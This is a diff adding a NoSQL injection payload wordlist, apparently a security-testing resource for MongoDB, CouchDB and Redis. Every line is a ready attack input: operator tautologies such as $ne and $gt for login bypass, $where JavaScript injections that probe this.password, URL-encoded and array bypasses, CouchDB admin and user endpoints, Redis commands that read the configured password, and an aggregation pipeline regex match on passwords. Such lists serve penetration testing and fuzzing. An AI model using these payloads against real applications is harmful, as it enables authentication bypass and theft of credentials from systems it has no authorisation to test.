@@ -1,0 +1,60 @@
+# WebSecure NoSQLi Payload List — MongoDB, CouchDB operators
+# ── MongoDB $ne tautology (query param style) ──
+[$ne]=1
+[$ne]=null
+[$ne][0]=
+[$gt]=
+[$gte]=0
+[$lt]=99999
+[$lte]=99999
+[$in][]=admin
+[$in][]=root
+[$in][]=user
+[$nin][]=invalid
+[$regex]=.*
+[$regex]=^a
+[$exists]=true
+[$where]=1
+[$where]=true
+# ── JSON body operators ──
+{"$ne": null}
+{"$ne": "invalid"}
+{"$ne": "-1"}
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": "zzzzzzzzzzzzzz"}
+{"$regex": ".*"}
+{"$regex": "^admin"}
+{"$in": ["admin","root","administrator"]}
+{"$nin": ["invalid_user"]}
+{"$exists": true}
+{"$where": "1==1"}
+{"$where": "function(){return true;}"}
+{"$expr": {"$gt": ["$price", 0]}}
+# ── $where JS injection ──
+' && this.password.match(/.*/) //
+' && this.username == 'admin
+'; return true; //
+'; return true || 'x'=='x
+'; return /.*/.test(this.password) //
+' || 1==1//
+' || 1==1%00
+# ── URL-encoded bracket operators ──
+%24ne=1
+%24gt=0
+%24regex=.*
+# ── Array bypass ──
+["admin"]
+[""]
+["admin","root"]
+# ── CouchDB ──
+/_users/org.couchdb.user:admin
+/_all_docs
+/_config/admins/
+# ── Redis (through app) ──
+KEYS *
+CONFIG GET requirepass
+DEBUG SLEEP 5
+INFO server
+# ── Aggregation pipeline injection ──
+[{"$match":{"password":{"$regex":".*"}}}]
